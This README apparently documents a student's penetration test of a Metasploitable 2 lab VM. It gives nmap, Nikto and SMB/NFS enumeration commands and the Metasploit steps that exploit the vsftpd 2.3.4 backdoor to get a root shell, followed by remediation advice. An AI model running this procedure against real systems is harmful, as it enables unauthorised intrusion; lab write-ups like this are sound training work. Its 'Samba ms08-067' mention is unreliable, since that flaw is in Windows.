# Penetration Testing Lab — Metasploitable 2 Environment

A structured penetration test simulating a real-world ethical hacking engagement against a vulnerable Linux target in a segmented network environment. Conducted using industry-standard methodology (PTES) with tools including Nmap, Metasploit, and Nikto.

---

## Table of Contents

1. [Introduction & Overview](#introduction--overview)
2. [Environment & Tools](#environment--tools)
3. [Technical Skills Demonstrated](#technical-skills-demonstrated)
4. [Implementation Process](#implementation-process)
   - [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
   - [Phase 2 — Vulnerability Analysis](#phase-2--vulnerability-analysis)
   - [Phase 3 — Exploitation](#phase-3--exploitation)
   - [Phase 4 — Post-Exploitation](#phase-4--post-exploitation)
   - [Phase 5 — Mitigation](#phase-5--mitigation)
5. [Visual Evidence](#visual-evidence)
6. [Results & Key Findings](#results--key-findings)
7. [Installation & Setup](#installation--setup)
8. [Challenges & Lessons Learned](#challenges--lessons-learned)
9. [Conclusion & Future Work](#conclusion--future-work)
10. [Contact](#contact)

---

## Introduction and Overview

### Background

This project simulates a penetration test commissioned by a fictional human rights organisation that had observed unusual activity across its network — unexpected traffic spikes during off-hours, failed login attempts on its email server, and unauthorised permission changes. The organisation required a controlled assessment to identify exploitable weaknesses before a real attacker could take advantage of them.

The target was a Linux server hosted in the organisation's **DMZ (Demilitarised Zone)** — the network segment exposed to external traffic while sitting behind the core internal network. This is a common and high-value target in real-world engagements.

### Objective

- Identify open ports and running services on the DMZ target
- Discover exploitable vulnerabilities linked to specific software versions and misconfigurations
- Validate confirmed vulnerabilities through controlled exploitation using Metasploit
- Assess the potential impact of a successful attack (privilege level, data exposure)
- Deliver actionable remediation recommendations prioritised by severity

The test was conducted following the **Penetration Testing Execution Standard (PTES)** — an industry-recognised framework covering seven structured phases from pre-engagement through to reporting.


## Environment & Tools

| Category | Details |
|---|---|
| **Attacker Machine** | Kali Linux |
| **Target Machine** | Metasploitable 2 |
| **Network Setup** | Isolated lab environment (attacker and target on the same subnet) |
| **Methodology** | Penetration Testing Execution Standard (PTES) |

### Tools Used

| Tool | Purpose |
|---|---|
| **Nmap** | Port scanning, service/version detection, NSE vulnerability scripts |
| **Metasploit Framework** | Exploit selection, configuration, and execution |
| **Nikto** | Web server vulnerability scanning and misconfiguration detection |


---

## Technical Skills Demonstrated

- **Network Reconnaissance** : Host discovery and full TCP port scanning
- **Service Enumeration** : Identifying software versions and exposed services
- **Vulnerability Research** : Mapping detected software to known CVEs
- **Exploit Development & Execution** : Using Metasploit to exploit CVE-2011-2523
- **Web Application Assessment** : Misconfiguration testing with Nmap and Nikto
- **File Share Enumeration** : SMB share and NFS export discovery via Nmap NSE
- **Post-Exploitation Analysis** : Evaluating attacker impact at root privilege level
- **Risk-Based Reporting** : Categorising findings by severity with remediation guidance
- **Ethical & Scoped Testing** : Maintaining defined boundaries throughout the engagement



## Implementation Process

### Phase 1 Reconnaissance

**Goal:** Map the target's attack surface before attempting any exploitation.

The first step was confirming the attacker machine's own IP address to avoid scanning the wrong host, a basic but critical step in any engagement.

```bash
ip a
```

*Figure 1 : Identifying the attacker's IP address*

Host discovery was then performed to confirm the target was live on the network.

```bash
nmap -sn 192.168.x.0/24
```

*Figure 2 — Host discovery confirming target is online*

A full TCP SYN scan was run across all 65,535 ports to identify every open service on the target.

```bash
nmap -sS -p- 192.168.x.x
```

**Result:** 13 open TCP ports were discovered, including:

| Port | Service |
|---|---|
| 21 | FTP (vsftpd) |
| 22 | SSH (OpenSSH) |
| 80 | HTTP (Apache) |
| 139, 445 | SMB (Samba) |
| 111, 2049 | RPC / NFS |

*Figure 3  Full TCP port scan results*



### Phase 2 Vulnerability Analysis

**Goal:** Identify exploitable weaknesses in the discovered services.

Service and version detection was run to understand exactly what software was running on each open port.

```bash
nmap -sV 192.168.x.x
```

*Figure 4 Service and version detection output*

Three significant vulnerabilities were identified:

---

#### vsftpd 2.3.4 — CVE-2011-2523 (Critical)

The FTP service on port 21 was running **vsftpd version 2.3.4**, a version known to contain a deliberately planted backdoor. This backdoor allows an attacker to trigger a root shell without any authentication by sending a specific sequence during login.

Confirmed with an Nmap NSE vulnerability script:

```bash
nmap --script ftp-vsftpd-backdoor -p 21 192.168.x.x
```

*Figure 5 Nmap confirming the vsftpd 2.3.4 backdoor*

**Why it matters:** No credentials are required. A successful exploit gives root-level shell access, the highest privilege level on a Linux system.



#### Apache HTTP Server 2.2.22 (High)

The web server on port 80 was running **Apache 2.2.22**  a version that reached end-of-life in December 2017 and no longer receives security patches. Additional misconfigurations were identified:

- **TRACE HTTP method enabled** : enables Cross-Site Tracing (XST) attacks
- **Directory indexing exposed** : `/css/`, `/js/`, `/icons/` all browsable
- **Missing security headers** : no `X-Frame-Options`, `Content-Security-Policy`, etc.
- **Server version disclosed** : response headers reveal software and version to any requester

```bash
nmap --script http-methods,http-trace -p 80 192.168.x.x
nikto -h http://192.168.x.x
```

> *Figure 6 — Nmap version detection showing Apache 2.2.22*  
> *Figure 14 — Nmap HTTP scripts showing TRACE enabled and exposed directories*  
> *Figure 15 — Nikto scan confirming EOL status and web misconfigurations*



#### Exposed SMB and NFS Services (Medium)

Ports 139, 445, and 2049 exposed SMB and NFS file-sharing services externally. These are protocols designed for use within trusted internal networks only.

```bash
nmap --script smb-enum-shares,smb-os-discovery -p 139,445 192.168.x.x
nmap --script nfs-showmount -p 2049 192.168.x.x
```

Findings included:
- SMB shares (`IPC$`, `print$`, `public`) enumerable with **anonymous access**
- NFS `/files` directory exported to **all hosts** (`*`) with no access control

> *Figure 16 — SMB enumeration showing anonymously accessible shares*  
> *Figure 17 — SMB OS discovery revealing system information*  
> *Figure 18/19 — NFS showmount confirming unrestricted /files export*

---

### Phase 3  Exploitation

**Goal:** Validate confirmed vulnerabilities through controlled, scoped exploitation.

#### Exploiting CVE-2011-2523 (vsftpd 2.3.4)

Metasploit was used to exploit the vsftpd backdoor. This is a well-documented module that demonstrates how trivially this vulnerability can be weaponised.

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.x.x
show options
run
```

*Figure 8 : Metasploit launched*  
*Figure 9 : vsftpd_234_backdoor module selected*  
*Figure 10/11 : Target configured and parameters verified*  
*Figure 12 : Successful exploitation: root shell obtained*

**Outcome:** A root shell session was opened with no credentials. This confirms full system compromise is achievable by any attacker who can reach port 21.

#### Apache HTTP Server Assessment

Rather than attempting a full exploit (which was outside scope), the Apache assessment focused on validating dangerous misconfigurations:

```bash
nmap --script http-methods -p 80 192.168.x.x 
nikto -h http://192.168.x.x                  
```

**Outcome:** Confirmed EOL software, insecure methods, missing headers, and information disclosure — all increasing the attack surface for future exploitation.

#### SMB & NFS Enumeration

The goal was information disclosure without accessing or modifying any data.

```bash
nmap --script smb-enum-shares -p 139,445 192.168.x.x
showmount -e 192.168.x.x
```

**Outcome:** Confirmed anonymous read/write access on SMB shares and unrestricted NFS export. No data was read or altered during testing.

---

### Phase 4 : Post-Exploitation

**Goal:** Understand the real-world impact of the compromise.

With root shell access obtained via vsftpd, the attacker's position was assessed:

- **Privilege level:** Root (no escalation needed)
- **Potential impact:** Full file system access (read, write, delete), ability to add or remove user accounts, install services or backdoors, disable logging, and pivot deeper into the network
- **Persistence potential:** At root level, an attacker could deploy a hidden backdoor service, modify startup scripts, or create a new privileged account, all without detection

No persistence mechanisms were deployed. No files were read, modified, or deleted. The post-exploitation phase was deliberately limited to analysis only, in line with the defined scope and ethical testing principles.



### Phase 5 — Mitigation

Full remediation recommendations are covered in [Results & Key Findings](#results--key-findings).

---

## Visual Evidence

Screenshots should be placed in a `/screenshots` directory in this repository and referenced inline where marked above.

```
screenshots/
├── figure-01-attacker-ip.png
├── figure-02-host-discovery.png
├── figure-03-port-scan.png
├── figure-04-service-version.png
├── figure-05-vsftpd-confirmed.png
├── figure-06-apache-version.png
├── figure-08-metasploit-launch.png
├── figure-09-module-selected.png
├── figure-10-target-configured.png
├── figure-11-params-verified.png
├── figure-12-root-shell.png
├── figure-14-http-trace-dirs.png
├── figure-15-nikto-results.png
├── figure-16-smb-shares.png
├── figure-17-smb-os.png
├── figure-18-nfs-port.png
└── figure-19-nfs-export.png
```

---

## Results & Key Findings

### Summary of Findings

| Severity | Vulnerability | Impact |
|---|---|---|
| 🔴 **Critical** | vsftpd 2.3.4 — CVE-2011-2523 backdoor | Unauthenticated remote root shell access |
| 🟠 **High** | Apache 2.2.22 — EOL, TRACE enabled, headers missing | Information disclosure, web-based attack surface |
| 🟡 **Medium** | Exposed SMB & NFS with anonymous access | Unauthorised share enumeration and file exposure |

### Remediation Table

| Vulnerability | Risk | Action Required |
|---|---|---|
| vsftpd 2.3.4 backdoor | Critical | Remove or replace FTP service; use SFTP (port 22) instead |
| Apache 2.2.22 EOL | High | Upgrade to a supported Apache version (2.4.x) |
| TRACE method enabled | High | Disable via `TraceEnable Off` in Apache config |
| Directory indexing | High | Disable with `Options -Indexes` in Apache config |
| Missing security headers | Medium–High | Add `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options` |
| SMB anonymous access | Medium | Disable anonymous access; restrict SMB to internal trusted hosts only |
| NFS wildcard export | Medium | Replace `*` with specific trusted IP ranges in `/etc/exports` |
| Unnecessary open ports | Medium | Audit and close all ports not required for core functionality |

---

## Installation & Setup

To replicate this lab environment:

### Prerequisites

- [VirtualBox](https://www.virtualbox.org/) or VMware
- [Kali Linux](https://www.kali.org/get-kali/) (attacker)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/) (target)

### Setup

1. Import Metasploitable 2 into VirtualBox and set the network adapter to **Host-Only** mode
2. Boot Kali Linux and confirm it is on the same Host-Only network
3. Confirm connectivity with `ping <target-ip>`
4. Run the commands documented in each phase section above

> ⚠️ **Legal Notice:** Only perform penetration testing against systems you own or have explicit written permission to test. Unauthorised access is a criminal offence under the Computer Misuse Act 1990 (UK) and equivalent legislation worldwide.

---

## Challenges & Lessons Learned

### Knowing when to stop

One of the hardest professional judgments in an engagement is recognising when to stop. Gaining root shell access could have led to reading files, creating accounts, or deploying persistence. Choosing not to do any of that — and being able to explain why — is itself a core professional skill. Restraint is not a limitation; it is part of ethical practice.

### False positive management

During vulnerability scanning, not every flagged issue is exploitable. Manually verifying each finding before carrying it forward reduced noise and ensured only genuine risks reached the report. This is especially important when communicating with non-technical stakeholders who rely on the report to prioritise remediation.

### Communicating risk clearly

Translating technical findings (e.g. "TRACE method enabled") into business-level impact (e.g. "an attacker could steal authenticated session credentials via a cross-site tracing attack") is a skill that takes deliberate practice. This project reinforced the importance of writing findings that are useful to both engineers and decision-makers.

---

## Conclusion & Future Work

This project demonstrated the full penetration testing lifecycle — from reconnaissance through to risk-ranked reporting — against a purposefully vulnerable target. Three vulnerabilities were identified across FTP, HTTP, and file-sharing services, one of which was confirmed exploitable to root access via Metasploit.

**Potential future extensions to this project:**

- Automate the scanning and reporting pipeline using a Python script
- Expand the scope to include the full Metasploitable 2 attack surface (e.g. Samba ms08-067, PostgreSQL, IRC)
- Integrate a CVSS scoring model into the findings table
- Add a custom Nmap NSE script to demonstrate scripting capability


---

*This project was conducted in a controlled lab environment for educational purposes. All testing was performed against systems I own and operate. No real-world systems were accessed.*
